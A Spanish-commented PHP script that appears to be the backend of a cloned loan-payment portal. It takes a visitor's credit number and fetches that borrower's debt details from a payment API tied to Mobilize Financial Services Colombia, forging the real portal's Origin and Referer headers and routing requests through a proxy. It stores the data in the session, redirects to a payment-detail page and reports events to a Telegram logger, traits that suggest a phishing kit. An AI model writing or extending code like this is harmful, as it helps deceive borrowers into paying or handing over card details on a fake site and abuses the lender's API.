<?php

session_start();

require_once __DIR__ . '/includes/telegram-logger.php';

header('Content-Type: application/json; charset=utf-8');

/*
|--------------------------------------------------------------------------
| CONFIGURACIÓN
|--------------------------------------------------------------------------
*/

define(
    'API_URL',
    'https://t3a9z73ceg.execute-api.us-east-1.amazonaws.com/prod/paymentez/1111111/oracle/get-user-info'
);

define('PROXY_HOST', getenv('PROXY_HOST') ?: 'gw.psbproxy.io');
define('PROXY_PORT', getenv('PROXY_PORT') ?: 823);
define('PROXY_USER', getenv('PROXY_USER') ?: '');
define('PROXY_PASS', getenv('PROXY_PASS') ?: '');

define('USE_PROXY', true);


/*
|--------------------------------------------------------------------------
| LOG A TXT
|--------------------------------------------------------------------------
*/

function writeApiDebugLog(string $message, array $context = []): void
{
    $logDir = __DIR__ . '/logs';

    if (!is_dir($logDir)) {
        @mkdir($logDir, 0775, true);
    }

    $logFile = $logDir . '/api-debug.txt';

    $timestamp = date('Y-m-d H:i:s');

    $line = "\n";
    $line .= "============================================================\n";
    $line .= "[$timestamp] $message\n";

    if (!empty($context)) {
        foreach ($context as $key => $value) {

            // Evitar valores demasiado grandes
            if (is_array($value)) {
                $value = json_encode(
                    $value,
                    JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES
                );
            }

            $line .= "$key: $value\n";
        }
    }

    $line .= "============================================================\n";

    file_put_contents(
        $logFile,
        $line,
        FILE_APPEND | LOCK_EX
    );
}


/*
|--------------------------------------------------------------------------
| TELEGRAM
|--------------------------------------------------------------------------
*/

function logTelegram($action, $data = [])
{
    if (function_exists('telegram_log')) {
        telegram_log($action, $data);
    }
}


/*
|--------------------------------------------------------------------------
| VALIDACIÓN
|--------------------------------------------------------------------------
*/

if (
    $_SERVER['REQUEST_METHOD'] !== 'POST' ||
    empty($_POST['creditNumber'])
) {
    writeApiDebugLog('PETICIÓN RECHAZADA', [
        'method' => $_SERVER['REQUEST_METHOD'] ?? 'unknown',
        'reason' => 'creditNumber vacío'
    ]);

    http_response_code(400);

    echo json_encode([
        'success' => false,
        'message' => 'Debes ingresar el número de crédito.'
    ]);

    exit;
}

$creditNumber = trim($_POST['creditNumber']);

if (!preg_match('/^[A-Za-z0-9\-]{1,30}$/', $creditNumber)) {

    writeApiDebugLog('CREDIT NUMBER INVÁLIDO', [
        'length' => strlen($creditNumber)
    ]);

    http_response_code(422);

    echo json_encode([
        'success' => false,
        'message' => 'El número de crédito ingresado no es válido.'
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| LOG INICIAL
|--------------------------------------------------------------------------
*/

writeApiDebugLog('INICIO DE PETICIÓN', [
    'php_version' => PHP_VERSION,
    'curl_version' => function_exists('curl_version')
        ? curl_version()['version']
        : 'NO DISPONIBLE',
    'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
    'request_method' => $_SERVER['REQUEST_METHOD'] ?? 'unknown',
    'remote_ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    'api_host' => parse_url(API_URL, PHP_URL_HOST),
    'proxy_enabled' => USE_PROXY ? 'SI' : 'NO',
    'proxy_host' => PROXY_HOST,
    'proxy_port' => PROXY_PORT,
    'proxy_user_configured' => PROXY_USER !== '' ? 'SI' : 'NO',
]);


/*
|--------------------------------------------------------------------------
| PAYLOAD
|--------------------------------------------------------------------------
*/

$payload = json_encode([
    'creditNumber' => $creditNumber,
    'forceRequest' => true,
    'chanel' => 'test'
]);

if ($payload === false) {

    writeApiDebugLog('ERROR CREANDO PAYLOAD', [
        'json_error' => json_last_error_msg()
    ]);

    http_response_code(500);

    echo json_encode([
        'success' => false,
        'message' => 'Error preparando la petición.'
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| CURL
|--------------------------------------------------------------------------
*/

$ch = curl_init();

curl_setopt_array($ch, [

    CURLOPT_URL => API_URL,

    CURLOPT_RETURNTRANSFER => true,

    CURLOPT_POST => true,

    CURLOPT_POSTFIELDS => $payload,

    CURLOPT_HTTPHEADER => [
        'Content-Type: application/json',
        'Origin: https://www.mobilize-fs.com.co',
        'Referer: https://www.mobilize-fs.com.co/portal-pagos/',
        'Accept: application/json',
        'User-Agent: Mozilla/5.0'
    ],

    CURLOPT_TIMEOUT => 30,

    CURLOPT_CONNECTTIMEOUT => 15,

    /*
     * IMPORTANTE:
     * Nos permite diagnosticar problemas de SSL/DNS/conexión.
     */
    CURLOPT_VERBOSE => true,

    /*
     * Forzar IPv4 puede ayudar si Railway/proxy tiene
     * problemas con IPv6.
     */
    CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,

]);


/*
|--------------------------------------------------------------------------
| CONFIGURAR PROXY
|--------------------------------------------------------------------------
*/

if (USE_PROXY) {

    curl_setopt($ch, CURLOPT_PROXY, PROXY_HOST);
    curl_setopt($ch, CURLOPT_PROXYPORT, PROXY_PORT);

    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

    if (PROXY_USER !== '' && PROXY_PASS !== '') {

        curl_setopt(
            $ch,
            CURLOPT_PROXYUSERPWD,
            PROXY_USER . ':' . PROXY_PASS
        );
    }

    writeApiDebugLog('PROXY CONFIGURADO', [
        'host' => PROXY_HOST,
        'port' => PROXY_PORT,
        'type' => 'HTTP',
        'credentials' => (
            PROXY_USER !== '' && PROXY_PASS !== ''
                ? 'CONFIGURADAS'
                : 'NO CONFIGURADAS'
        )
    ]);

} else {

    writeApiDebugLog('PETICIÓN SIN PROXY');
}


/*
|--------------------------------------------------------------------------
| EJECUTAR
|--------------------------------------------------------------------------
*/

$startTime = microtime(true);

$response = curl_exec($ch);

$duration = round(
    (microtime(true) - $startTime) * 1000,
    2
);


/*
|--------------------------------------------------------------------------
| INFORMACIÓN CURL
|--------------------------------------------------------------------------
*/

$errno = curl_errno($ch);

$error = curl_error($ch);

$info = curl_getinfo($ch);

$httpCode = (int) ($info['http_code'] ?? 0);


/*
|--------------------------------------------------------------------------
| LOG DETALLADO
|--------------------------------------------------------------------------
*/

writeApiDebugLog('CURL TERMINÓ', [

    'duration_ms' => $duration,

    'curl_errno' => $errno,

    'curl_error' => $error ?: 'NINGUNO',

    'http_code' => $httpCode,

    'response_size' => (
        $response !== false
            ? strlen($response)
            : 0
    ),

    'namelookup_time' => $info['namelookup_time'] ?? null,

    'connect_time' => $info['connect_time'] ?? null,

    'pretransfer_time' => $info['pretransfer_time'] ?? null,

    'starttransfer_time' => $info['starttransfer_time'] ?? null,

    'total_time' => $info['total_time'] ?? null,

    'primary_ip' => $info['primary_ip'] ?? null,

    'local_ip' => $info['local_ip'] ?? null,

    'primary_port' => $info['primary_port'] ?? null,

    'local_port' => $info['local_port'] ?? null,

    'redirect_count' => $info['redirect_count'] ?? null,

    'content_type' => $info['content_type'] ?? null,

    'download_content_length' =>
        $info['download_content_length'] ?? null,

]);


/*
|--------------------------------------------------------------------------
| RESPUESTA DE LA API
|--------------------------------------------------------------------------
*/

if ($response !== false) {

    /*
     * NO guardar toda la respuesta.
     * Solamente una muestra para diagnóstico.
     */
    writeApiDebugLog('RESPUESTA API - MUESTRA', [

        'first_500_chars' =>
            substr($response, 0, 500)

    ]);
}


/*
|--------------------------------------------------------------------------
| CERRAR CURL
|--------------------------------------------------------------------------
*/

curl_close($ch);


/*
|--------------------------------------------------------------------------
| ERROR CURL
|--------------------------------------------------------------------------
*/

if ($errno || $response === false) {

    writeApiDebugLog('ERROR CURL', [

        'errno' => $errno,

        'error' => $error,

        'error_description' =>
            function_exists('curl_strerror')
                ? curl_strerror($errno)
                : 'No disponible',

        'http_code' => $httpCode,

    ]);

    logTelegram('❌ Error de conexión con la API', [

        'Error cURL' => $error ?: curl_strerror($errno),

        'HTTP Code' => $httpCode,

    ]);

    http_response_code(502);

    echo json_encode([
        'success' => false,
        'message' => 'Error de conexión con el servicio.'
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| HTTP NO EXITOSO
|--------------------------------------------------------------------------
*/

if ($httpCode < 200 || $httpCode >= 300) {

    writeApiDebugLog('API RESPONDIÓ CON HTTP NO EXITOSO', [

        'http_code' => $httpCode,

        'response_sample' =>
            substr($response, 0, 1000)

    ]);
}


/*
|--------------------------------------------------------------------------
| JSON
|--------------------------------------------------------------------------
*/

$data = json_decode($response, true);

$jsonError = json_last_error_msg();

if ($data === null && $jsonError !== 'No error') {

    writeApiDebugLog('ERROR DECODIFICANDO JSON', [

        'json_error' => $jsonError,

        'response_sample' =>
            substr($response, 0, 1000)

    ]);

    logTelegram('⚠️ Respuesta JSON inválida', [
        'Error' => $jsonError,
    ]);

    http_response_code(500);

    echo json_encode([
        'success' => false,
        'message' => 'La respuesta del servicio no es válida.'
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| USER INFO
|--------------------------------------------------------------------------
*/

if (
    isset($data['userInfo']) &&
    is_array($data['userInfo'])
) {

    $userInfo = $data['userInfo'];

    $concept =
        $data['paymentDescription']
        ?? 'Pago credito RCI';

    $minPayment =
        $userInfo['PAGO_MINIMO']
        ?? null;

    $totalDebt =
        $userInfo['PAGO_TOTAL']
        ?? null;

    $dueDate =
        $userInfo['FECHA_VENCIMIENTO_PAGO']
        ?? null;

    $valueToPay = $minPayment;


    /*
     * Sesión
     */

    $_SESSION['userInfo'] = $userInfo;

    $_SESSION['creditNumber'] = $creditNumber;

    $_SESSION['payment'] = [

        'concept' => $concept,

        'minPayment' => $minPayment,

        'totalDebt' => $totalDebt,

        'dueDate' => $dueDate,

        'valueToPay' => $valueToPay,

    ];


    writeApiDebugLog('API RESPONDIÓ CORRECTAMENTE', [

        'http_code' => $httpCode,

        'has_userInfo' => 'SI',

        'has_paymentDescription' =>
            isset($data['paymentDescription'])
                ? 'SI'
                : 'NO',

    ]);


    echo json_encode([
        'success' => true,
        'redirect' => 'detalle-pago.php'
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| SIN USER INFO
|--------------------------------------------------------------------------
*/

writeApiDebugLog('API RESPONDIÓ PERO SIN USERINFO', [

    'http_code' => $httpCode,

    'message' =>
        $data['message']
        ?? 'Sin mensaje',

    'response_sample' =>
        substr($response, 0, 1000)

]);


logTelegram('⚠️ Crédito no encontrado', []);

http_response_code(404);

echo json_encode([
    'success' => false,
    'message' =>
        'No encontramos información asociada a ese número de crédito.'
]);
